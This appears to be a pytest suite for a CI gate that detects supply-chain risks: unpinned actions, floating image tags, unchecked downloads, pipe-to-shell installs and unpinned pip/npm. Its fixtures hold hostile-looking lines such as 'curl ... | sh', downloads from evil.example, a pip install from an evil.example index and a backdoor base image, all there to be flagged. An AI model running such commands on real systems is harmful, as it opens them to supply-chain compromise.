"""Tests for scripts/ci/check_supply_chain.py (Pattern 6: unpinned supply chain).

Every test asserts a *failure* is produced for genuinely unpinned input,
not merely that the checker runs. Fixture inputs reproduce the exact
shapes removed from this repo by the fix (unpinned pip install with a
system-package bypass fallback, locked to unlocked npm fallback).
"""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "ci" / "check_supply_chain.py"
REPO_ROOT = Path(__file__).resolve().parents[2]


def _load_module():
    spec = importlib.util.spec_from_file_location("check_supply_chain", _SCRIPT)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    # Dataclasses resolve their module namespace through sys.modules,
    # so the module must be registered before execution.
    sys.modules["check_supply_chain"] = module
    spec.loader.exec_module(module)
    return module


mod = _load_module()


@pytest.fixture()
def repo(tmp_path: Path) -> Path:
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / "scripts").mkdir()
    (tmp_path / "frontend").mkdir()
    (tmp_path / "requirements.lock").write_text("# locked\n")
    (tmp_path / "frontend" / "package-lock.json").write_text("{}\n")
    (tmp_path / "scripts" / "ci").mkdir(parents=True)
    baseline = {"version": 1, "entries": []}
    (tmp_path / "scripts" / "ci" / "supply_chain_baseline.json").write_text(json.dumps(baseline))
    return tmp_path


def _write(repo: Path, name: str, body: str) -> Path:
    path = repo / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)
    return path


def _rules(violations) -> set[str]:
    return {v.rule for v in violations}


# Action pinning ------------------------------------------------------------


def test_action_pin_accepts_full_sha(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        "steps:\n  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n",
    )
    assert mod.check_action_pin(path, "ok.yml") == []


def test_action_pin_ignores_status_permissions_but_checks_uses(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/statuses.yml",
        "permissions:\n  statuses: write\n  statuses: read\nsteps:\n  - uses: actions/checkout@v4\n  - {uses: actions/setup-node@v4}\n",
    )
    violations = mod.check_action_pin(path, "statuses.yml")
    assert [v.line for v in violations] == [5, 6]
    assert [v.rule for v in violations] == ["action-pin", "action-pin"]


def test_action_pin_rejects_tag_ref(repo: Path) -> None:
    path = _write(repo, ".github/workflows/bad.yml", "steps:\n  - uses: actions/checkout@v4\n")
    violations = mod.check_action_pin(path, "bad.yml")
    assert len(violations) == 1
    assert violations[0].rule == "action-pin"


def test_action_pin_rejects_branch_ref(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "steps:\n  - uses: owner/action@main\n",
    )
    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}


@pytest.mark.parametrize("access", ["read", "write"])
def test_action_pin_ignores_status_permissions_but_checks_uses(repo: Path, access: str) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        f"permissions:\n  statuses: {access}\nsteps:\n  - uses: actions/checkout@v4\n",
    )
    violations = mod.check_action_pin(path, "bad.yml")
    assert len(violations) == 1
    assert violations[0].line == 4
    assert violations[0].text == "- uses: actions/checkout@v4"


def test_action_pin_checks_uses_in_flow_mapping(repo: Path) -> None:
    path = _write(repo, ".github/workflows/bad.yml", "steps: [{ uses: actions/checkout@v4 }]\n")
    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}


def test_action_pin_allows_local_reusable_workflow(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        "jobs:\n  call:\n    uses: ./.github/workflows/other.yml\n",
    )
    assert mod.check_action_pin(path, "ok.yml") == []


# Pipe to shell ------------------------------------------------------------


def test_pipe_to_shell_detected(repo: Path) -> None:
    path = _write(repo, "scripts/setup.sh", "#!/bin/sh\ncurl -fsSL https://x.io/i.sh | sh\n")
    assert _rules(mod.check_pipe_shell(path, "setup.sh")) == {"pipe-shell"}


def test_checksum_pipe_not_flagged_as_shell(repo: Path) -> None:
    # A checksum verification pipe must not trip the shell rule.
    path = _write(
        repo,
        "scripts/ok.sh",
        'echo "${SHA}  /tmp/t.tar.gz" | sha256sum -c -\n',
    )
    assert mod.check_pipe_shell(path, "ok.sh") == []


# Floating versions --------------------------------------------------------


def test_latest_url_detected(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "run: curl -sSfL https://x.io/releases/latest/dl.tar.gz -o /tmp/dl.tar.gz\n",
    )
    assert _rules(mod.check_latest_url(path, "bad.yml")) == {"latest-url"}


def test_at_latest_install_detected(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/setup.sh",
        "go install github.com/gitleaks/gitleaks/v8@latest\n",
    )
    assert _rules(mod.check_latest_url(path, "setup.sh")) == {"latest-url"}


def test_image_without_digest_detected(repo: Path) -> None:
    path = _write(repo, "Dockerfile", "FROM python:3.11-slim AS base\n")
    violations = mod.check_image_digest_dockerfile(path, "Dockerfile")
    assert len(violations) == 1
    assert violations[0].rule == "image-digest"


def test_image_with_digest_passes(repo: Path) -> None:
    path = _write(
        repo,
        "Dockerfile",
        "FROM python:3.11-slim@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef AS base\n",
    )
    assert mod.check_image_digest_dockerfile(path, "Dockerfile") == []


def test_compose_image_without_digest_detected(repo: Path) -> None:
    path = _write(repo, "docker-compose.dev.yml", "services:\n  db:\n    image: postgres:17\n")
    assert _rules(mod.check_image_digest_yaml(path, "compose")) == {"image-digest"}


# Downloads and installs ---------------------------------------------------


def test_archive_download_without_checksum_detected(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/get.sh",
        "wget https://github.com/grafana/k6/releases/download/v0.47.0/k6.tar.gz\n",
    )
    assert _rules(mod.check_download_checksum(path, "get.sh")) == {"download-checksum"}


def test_archive_download_with_checksum_passes(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/get.sh",
        "K_SHA256: abc123  # pragma: allowlist secret\n"
        "curl -sSfL https://x.io/k.tar.gz -o /tmp/k.tar.gz\n"
        'echo "${K_SHA256}  /tmp/k.tar.gz" | sha256sum -c -\n',
    )
    assert mod.check_download_checksum(path, "get.sh") == []


def test_unpinned_pip_install_detected(repo: Path) -> None:
    # Exact shape removed from scripts/deploy_railway.sh by this fix.
    path = _write(
        repo,
        "scripts/deploy.sh",
        "pip install neo4j --quiet 2>/dev/null || pip install neo4j --quiet --break-system-packages 2>/dev/null\n",
    )
    assert {"pip-pin", "pip-break-system"} <= _rules(mod.check_pip(path, "deploy.sh"))


def test_pinned_pip_install_passes(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        'run: pip install "neo4j==6.3.1" --quiet\n',
    )
    assert mod.check_pip(path, "ok.yml") == []


def test_locked_requirements_pass(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/ok.sh",
        "pip install --quiet --require-hashes -r requirements.lock\n",
    )
    assert mod.check_pip(path, "ok.sh") == []


def test_npm_unlocked_fallback_detected(repo: Path) -> None:
    # Exact shape removed from scripts/install_pkgs.sh by this fix.
    path = _write(
        repo,
        "scripts/bootstrap.sh",
        "if ! (cd frontend && npm ci --silent); then\n    (cd frontend && npm install --silent)\nfi\n",
    )
    assert _rules(mod.check_npm(path, "bootstrap.sh")) == {"npm-unlocked"}


def test_npm_ci_and_pinned_global_pass(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/ok.sh",
        '(cd frontend && npm ci --silent)\nnpm install -g "@railway/cli@4.44.0"\n',
    )
    assert mod.check_npm(path, "ok.sh") == []


def test_npm_global_unpinned_scoped_detected(repo: Path) -> None:
    # The scope prefix `@vendor/` is part of the name, not a version pin.
    path = _write(repo, "scripts/setup.sh", "npm install -g @vendor/tool\n")
    assert _rules(mod.check_npm(path, "setup.sh")) == {"npm-unlocked"}


def test_npm_global_unpinned_bare_detected(repo: Path) -> None:
    path = _write(repo, "scripts/setup.sh", "npm install -g tool\n")
    assert _rules(mod.check_npm(path, "setup.sh")) == {"npm-unlocked"}


def test_npm_global_pinned_scoped_passes(repo: Path) -> None:
    path = _write(repo, "scripts/ok.sh", "npm install -g @vendor/tool@1.2.3\n")
    assert mod.check_npm(path, "ok.sh") == []


def test_npm_global_pinned_bare_passes(repo: Path) -> None:
    path = _write(repo, "scripts/ok.sh", "npm install -g tool@1.2.3\n")
    assert mod.check_npm(path, "ok.sh") == []


def test_npm_global_all_pinned_multi_passes(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/ok.sh",
        "npm install -g tool@1.2.3 @vendor/other@4.5.6\n",
    )
    assert mod.check_npm(path, "ok.sh") == []


def test_npm_global_range_version_rejected(repo: Path) -> None:
    path = _write(repo, "scripts/setup.sh", "npm install -g tool@^1.2.3\n")
    assert _rules(mod.check_npm(path, "setup.sh")) == {"npm-unlocked"}


def test_npm_global_tag_version_rejected(repo: Path) -> None:
    path = _write(repo, "scripts/setup.sh", "npm install -g @vendor/tool@latest\n")
    assert _rules(mod.check_npm(path, "setup.sh")) == {"npm-unlocked"}


def test_npm_global_mixed_pinned_and_unpinned_rejected(repo: Path) -> None:
    # One pinned package must not carry an unpinned sibling.
    path = _write(repo, "scripts/setup.sh", "npm install -g tool@1.2.3 othertool\n")
    assert _rules(mod.check_npm(path, "setup.sh")) == {"npm-unlocked"}


# Baseline behavior --------------------------------------------------------


def test_baseline_covers_known_violation() -> None:
    violations = [mod.Violation("image-digest", "Dockerfile", 4, "FROM python:3.11-slim")]
    baseline = [mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim", "reason")]
    failures, stale = mod.apply_baseline(violations, baseline)
    assert failures == []
    assert stale == []


def test_stale_baseline_entry_is_reported() -> None:
    baseline = [mod.BaselineEntry("pip-pin", "scripts/gone.sh", "pip install x", "reason")]
    failures, stale = mod.apply_baseline([], baseline)
    assert failures == []
    assert stale == baseline


def test_unbaselined_violation_survives() -> None:
    violations = [mod.Violation("pipe-shell", "scripts/x.sh", 1, "curl | sh")]
    failures, _ = mod.apply_baseline(violations, [])
    assert failures == violations


# End to end against the real tree -----------------------------------------


def test_real_tree_passes_with_committed_baseline() -> None:
    baseline_path = REPO_ROOT / "scripts" / "ci" / "supply_chain_baseline.json"
    violations = mod.find_violations(REPO_ROOT)
    assert violations, "expected the gate to find baselined items in this repo"
    baseline = mod.load_baseline(baseline_path)
    failures, stale = mod.apply_baseline(violations, baseline)
    assert failures == []
    assert stale == []


def test_real_tree_fails_with_empty_baseline(tmp_path: Path) -> None:
    # Without the baseline (the pre-fix state), the gate must fail: this
    # proves the checker actually detects the violations it claims to gate.
    empty = tmp_path / "baseline.json"
    empty.write_text('{"version": 1, "entries": []}')
    violations = mod.find_violations(REPO_ROOT)
    baseline = mod.load_baseline(empty)
    failures, _ = mod.apply_baseline(violations, baseline)
    assert failures, "gate must fail on the unbaselined tree"
    assert {v.rule for v in failures} >= {"image-digest", "pip-pin"}


# Workflow images (find_violations previously never invoked image-digest) ----

_VALID_DIGEST = "0123456789abcdef" * 4


def test_workflow_service_image_tag_fails(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    services:\n      db:\n        image: postgres:17\n",
    )
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_workflow_container_scalar_tag_fails(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    container: postgres:17\n    steps:\n      - run: echo hi\n",
    )
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_workflow_container_mapping_image_fails(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    container:\n      image: postgres:17\n",
    )
    violations = mod.check_image_digest_workflow(path, "bad.yml")
    assert len(violations) == 1
    assert violations[0].rule == "image-digest"


def test_workflow_container_mapping_header_passes(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        f"jobs:\n  t:\n    container:\n      image: postgres:17@sha256:{_VALID_DIGEST}\n",
    )
    assert mod.check_image_digest_workflow(path, "ok.yml") == []


def test_workflow_image_expression_with_spaces_fails(repo: Path) -> None:
    # Exact shape from backend-ci.yml: spaces must not bypass the regex.
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    services:\n      n:\n"
        "        image: ${{ matrix.service == 'graph' && 'neo4j:5.24-community' || '' }}\n",
    )
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_workflow_image_quoted_and_comment_fails(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        'jobs:\n  t:\n    services:\n      db:\n        image: "postgres:17" # pinned later\n',
    )
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_workflow_image_valid_digest_passes(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        f"jobs:\n  t:\n    services:\n      db:\n        image: postgres:17@sha256:{_VALID_DIGEST}\n",
    )
    assert mod.check_image_digest_workflow(path, "ok.yml") == []


def test_workflow_image_short_digest_fails(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    services:\n      db:\n        image: postgres:17@sha256:abc123\n",
    )
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_dockerfile_short_digest_fails(repo: Path) -> None:
    path = _write(repo, "Dockerfile", "FROM python:3.11-slim@sha256:abc123 AS base\n")
    assert _rules(mod.check_image_digest_dockerfile(path, "Dockerfile")) == {"image-digest"}


def test_docker_uses_tag_fails_image_rule_not_action_pin(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/bad.yml",
        "steps:\n  - uses: docker://postgres:17\n",
    )
    assert mod.check_action_pin(path, "bad.yml") == []
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


def test_docker_uses_valid_digest_passes_both_rules(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        f"steps:\n  - uses: docker://postgres:17@sha256:{_VALID_DIGEST}\n",
    )
    assert mod.check_action_pin(path, "ok.yml") == []
    assert mod.check_image_digest_workflow(path, "ok.yml") == []


def test_run_script_image_text_ignored(repo: Path) -> None:
    path = _write(
        repo,
        ".github/workflows/ok.yml",
        "jobs:\n  t:\n    steps:\n      - run: |\n"
        '          echo "image: postgres:17-evil"\n'
        "          cat <<EOF\n"
        "          image: postgres:17-evil\n"
        "          EOF\n"
        "      - run: echo image: postgres:17-evil\n"
        "      - run: echo '{image: postgres:17-evil}'\n",
    )
    assert mod.check_image_digest_workflow(path, "ok.yml") == []


def test_find_violations_includes_workflow_images(repo: Path) -> None:
    _write(
        repo,
        ".github/workflows/bad.yml",
        "jobs:\n  t:\n    services:\n      db:\n        image: postgres:17-evil\n",
    )
    violations = mod.find_violations(repo)
    assert any(v.rule == "image-digest" and v.file == ".github/workflows/bad.yml" for v in violations)


def test_new_unbaselined_workflow_image_fails_gate(repo: Path) -> None:
    _write(repo, ".github/workflows/new.yml", "jobs:\n  t:\n    container: node:99\n")
    assert mod.main(["--root", str(repo)]) == 1


def test_baseline_exact_covers_only_recorded_image() -> None:
    entry = mod.BaselineEntry("image-digest", ".github/workflows/x.yml", "image: postgres:17", "reason", exact=True)
    same = [mod.Violation("image-digest", ".github/workflows/x.yml", 1, "image: postgres:17")]
    failures, stale = mod.apply_baseline(same, [entry])
    assert failures == []
    assert stale == []


def test_baseline_exact_suffix_tag_bypass_fails() -> None:
    # Substring matching would hide postgres:17-evil under postgres:17.
    entry = mod.BaselineEntry("image-digest", ".github/workflows/x.yml", "image: postgres:17", "reason", exact=True)
    evil = [mod.Violation("image-digest", ".github/workflows/x.yml", 1, "image: postgres:17-evil")]
    failures, stale = mod.apply_baseline(evil, [entry])
    assert failures == evil
    assert stale == [entry]


def test_baseline_exact_stale_when_image_pinned() -> None:
    entry = mod.BaselineEntry("image-digest", ".github/workflows/x.yml", "image: postgres:17", "reason", exact=True)
    failures, stale = mod.apply_baseline([], [entry])
    assert failures == []
    assert stale == [entry]


def test_docker_comment_does_not_exempt_unpinned_action(repo: Path) -> None:
    path = _write(repo, ".github/workflows/bad.yml", "- uses: actions/checkout@v4 # docker://example\n")
    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}


@pytest.mark.parametrize("suffix", ["z", "/other", ":tag"])
def test_digest_must_end_the_image_reference(repo: Path, suffix: str) -> None:
    path = _write(repo, ".github/workflows/bad.yml", f"container: node@sha256:{_VALID_DIGEST}{suffix}\n")
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


@pytest.mark.parametrize(
    "declaration",
    [
        "services: { db: { image: postgres:17 } }",
        f"container: {{ image: node:20, env: {{ NOTE: '@sha256:{_VALID_DIGEST}' }} }}",
        "jobs: { test: { container: node:20 } }",
    ],
)
def test_flow_mapping_images_fail_closed(repo: Path, declaration: str) -> None:
    path = _write(repo, ".github/workflows/bad.yml", declaration + "\n")
    assert _rules(mod.check_image_digest_workflow(path, "bad.yml")) == {"image-digest"}


@pytest.mark.parametrize(
    "declaration",
    [
        f"container: {{ image: 'node@sha256:{_VALID_DIGEST}' }}",
        f"services: {{ db: {{ image: 'node@sha256:{_VALID_DIGEST}' }} }}",
    ],
)
def test_pinned_flow_image_passes(repo: Path, declaration: str) -> None:
    path = _write(repo, ".github/workflows/ok.yml", declaration + "\n")
    assert mod.check_image_digest_workflow(path, "ok.yml") == []


def test_unknown_baseline_key_is_not_silently_ignored(repo: Path) -> None:
    path = _write(
        repo,
        "baseline.json",
        json.dumps(
            {
                "entries": [
                    {
                        "rule": "image-digest",
                        "file": "workflow.yml",
                        "match": "image: postgres:17",
                        "reason": "existing tag",
                        "exact_match": True,
                    }
                ]
            }
        ),
    )
    with pytest.raises(TypeError):
        mod.load_baseline(path)


@pytest.mark.parametrize("quote", ['"', "'"])
@pytest.mark.parametrize(
    ("key", "value", "rule"),
    [
        ("image", "postgres:17", "image-digest"),
        ("container", "node:20", "image-digest"),
        ("uses", "docker://alpine:3.20", "image-digest"),
        ("uses", "actions/checkout@v4", "action-pin"),
    ],
)
def test_quoted_keys_do_not_bypass_gate(repo: Path, quote: str, key: str, value: str, rule: str) -> None:
    prefix = "- " if key == "uses" else ""
    _write(repo, ".github/workflows/new.yml", f"{prefix}{quote}{key}{quote}: {value}\n")
    assert rule in _rules(mod.find_violations(repo))
    assert mod.main(["--root", str(repo)]) == 1


@pytest.mark.parametrize("quote", ['"', "'"])
@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("image", f"postgres@sha256:{_VALID_DIGEST}"),
        ("container", f"node@sha256:{_VALID_DIGEST}"),
        ("uses", f"docker://alpine@sha256:{_VALID_DIGEST}"),
        ("uses", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"),
    ],
)
def test_quoted_keys_accept_valid_pins(repo: Path, quote: str, key: str, value: str) -> None:
    prefix = "- " if key == "uses" else ""
    _write(repo, ".github/workflows/new.yml", f"{prefix}{quote}{key}{quote}: {value}\n")
    assert mod.main(["--root", str(repo)]) == 0


# Hardened gate: baseline exactness --------------------------------------


def test_baseline_does_not_cover_longer_tag() -> None:
    # A baselined FROM line must not excuse the same stem with a suffix.
    # The entry uses the default (non-exact) flag on purpose: every entry
    # must match exactly regardless of the flag. The match is the short
    # stem the old baseline stored, which used to swallow the longer tag.
    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim", "reason")
    evil = [mod.Violation("image-digest", "Dockerfile", 1, "FROM python:3.11-slim-bookworm AS builder")]
    failures, stale = mod.apply_baseline(evil, [entry])
    assert failures == evil
    assert stale == [entry]


def test_baseline_comment_does_not_exempt_evil_line() -> None:
    # The scan decision strips comments, so matching must too: hiding the
    # baselined text after a `#` on an evil line must still fail.
    # Default (non-exact) flag on purpose, same as above.
    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim AS builder", "reason")
    evil = [
        mod.Violation(
            "image-digest",
            "Dockerfile",
            1,
            "FROM evil.example/backdoor:latest AS builder # FROM python:3.11-slim AS builder",
        )
    ]
    failures, _ = mod.apply_baseline(evil, [entry])
    assert failures == evil


def test_one_baseline_entry_excuses_one_line() -> None:
    entry = mod.BaselineEntry("image-digest", "Dockerfile", "FROM python:3.11-slim AS builder", "reason", exact=True)
    same = mod.Violation("image-digest", "Dockerfile", 1, "FROM python:3.11-slim AS builder")
    twin = mod.Violation("image-digest", "Dockerfile", 2, "FROM python:3.11-slim AS builder")
    failures, stale = mod.apply_baseline([same, twin], [entry])
    assert failures == [twin]
    assert stale == []


# Hardened gate: pip pins -------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "pip install --quiet --upgrade pip\n",
        "pip install 'foo==1.*'\n",
        'pip install "neo4j==${VER}"\n',
        "pip install --requirement=requirements.txt\n",
        "pip install --require-hashes -r requirements.lock evil\n",
        "pip install evil==1.2.3 --index-url https://evil.example/simple\n",
        "pip install evil==1.2.3 --trusted-host evil.example\n",
        "pip install -r requirements.txt\n",
        "pip install -r requirements.lock\n",
    ],
)
def test_unpinned_pip_forms_detected(repo: Path, line: str) -> None:
    path = _write(repo, "scripts/x.sh", line)
    assert _rules(mod.check_pip(path, "x.sh")) == {"pip-pin"}


def test_pinned_extras_and_quoted_venv_pip_pass(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/ok.sh",
        'pip install "pkg[extra]==1.2.3" --quiet\n"$REPO_ROOT/venv/bin/python" -m pip install "neo4j==6.3.1" --quiet\n',
    )
    assert mod.check_pip(path, "ok.sh") == []


# Hardened gate: per-download checksums ------------------------------------


def test_checksum_comment_is_not_evidence(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/get.sh",
        "# sha256sum\ncurl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
    )
    assert _rules(mod.check_download_checksum(path, "get.sh")) == {"download-checksum"}


def test_checksum_variable_name_is_not_evidence(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/get.sh",
        "FOO_SHA256=abc\ncurl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
    )
    assert _rules(mod.check_download_checksum(path, "get.sh")) == {"download-checksum"}


def test_second_download_needs_its_own_checksum(repo: Path) -> None:
    path = _write(
        repo,
        "scripts/get.sh",
        "curl -fsSL https://x.io/a.tar.gz -o /tmp/a.tar.gz\n"
        'echo "${A_SHA256}  /tmp/a.tar.gz" | sha256sum -c -\n'
        "curl -fsSL https://evil.example/b.tar.gz -o /tmp/b.tar.gz\n",
    )
    violations = mod.check_download_checksum(path, "get.sh")
    assert len(violations) == 1
    assert "b.tar.gz" in violations[0].text


# Hardened gate: Dockerfile RUN lines and every shell file -----------------


def test_dockerfile_run_pip_and_download_checked(repo: Path) -> None:
    _write(
        repo,
        "Dockerfile",
        "FROM scratch\nRUN pip install evil\nRUN curl -fsSL https://evil.example/a.tar.gz -o /tmp/a.tar.gz\n",
    )
    violations = mod.find_violations(repo)
    assert "pip-pin" in {v.rule for v in violations if v.file == "Dockerfile"}
    assert "download-checksum" in {v.rule for v in violations if v.file == "Dockerfile"}


def test_shell_files_cover_every_sh_repo_wide(repo: Path) -> None:
    _write(repo, "scripts/bad.sh", "pip install neo4j\nnpm install --silent\n")
    violations = mod.find_violations(repo)
    assert {"pip-pin", "npm-unlocked"} <= {v.rule for v in violations if v.file == "scripts/bad.sh"}
    assert mod.main(["--root", str(repo)]) == 1


def test_outer_shell_defect_fails_gate(repo: Path) -> None:
    _write(repo, "bin/setup.sh", "pip install neo4j\n")
    assert "pip-pin" in {v.rule for v in mod.find_violations(repo) if v.file == "bin/setup.sh"}
    assert mod.main(["--root", str(repo)]) == 1


# Hardened gate: templated action refs --------------------------------------


def test_templated_uses_fails_closed(repo: Path) -> None:
    path = _write(repo, ".github/workflows/bad.yml", "steps:\n  - uses: ${{ matrix.action }}\n")
    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}


def test_folded_uses_scalar_fails_closed(repo: Path) -> None:
    path = _write(repo, ".github/workflows/bad.yml", "steps:\n  - uses: >\n      owner/action@v1\n")
    assert _rules(mod.check_action_pin(path, "bad.yml")) == {"action-pin"}


def test_sudo_with_flags_pipe_still_detected(repo: Path) -> None:
    path = _write(repo, "scripts/setup.sh", "#!/bin/sh\ncurl -fsSL https://x.io/i.sh | sudo -E bash\n")
    assert _rules(mod.check_pipe_shell(path, "setup.sh")) == {"pipe-shell"}


# Hardened gate: main() exit paths ------------------------------------------


def test_missing_lockfile_fails_gate(repo: Path) -> None:
    (repo / "requirements.lock").unlink()
    assert mod.main(["--root", str(repo)]) == 1


def test_stale_baseline_entry_fails_gate(repo: Path) -> None:
    baseline = repo / "scripts" / "ci" / "supply_chain_baseline.json"
    baseline.write_text(
        json.dumps(
            {
                "version": 1,
                "entries": [
                    {
                        "rule": "pipe-shell",
                        "file": "scripts/gone.sh",
                        "match": "curl | sh",
                        "reason": "stale",
                        "exact": True,
                    }
                ],
            }
        )
    )
    assert mod.main(["--root", str(repo)]) == 1
